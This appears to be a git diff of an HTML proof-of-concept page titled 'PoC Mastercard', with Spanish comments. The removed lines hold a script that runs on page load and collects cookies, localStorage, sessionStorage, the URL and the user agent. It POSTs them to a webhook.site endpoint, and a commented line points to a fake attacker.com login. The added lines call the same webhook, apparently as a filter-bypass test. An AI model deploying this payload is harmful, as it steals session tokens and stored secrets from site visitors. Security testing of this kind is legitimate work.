@@ -1,35 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>PoC Mastercard</title>
-  <script>
-    (function() {
-      // Recolectar datos sensibles
-      const payload = {
-        cookie: document.cookie,
-        localStorage: JSON.stringify(localStorage),
-        sessionStorage: JSON.stringify(sessionStorage),
-        location: window.location.href,
-        userAgent: navigator.userAgent,
-      };
-
-      // Exfiltrar automáticamente al cargar
-      fetch("https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525", {
-        method: "POST",
-        mode: "no-cors",
-        body: JSON.stringify(payload),
-        headers: {
-          "Content-Type": "application/json"
-        }
-      });
-
-      // Opcional: Mostrar algo visual (falso login, redirect, o iframe)
-      // document.location = "https://attacker.com/login-falso.html"
-    })();
-  </script>
-</head>
 <body>
-  <h1>PoC ejecutada</h1>
+<script>
+fetch("https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?bypass-test=1");
+</script>
 </body>
 </html>
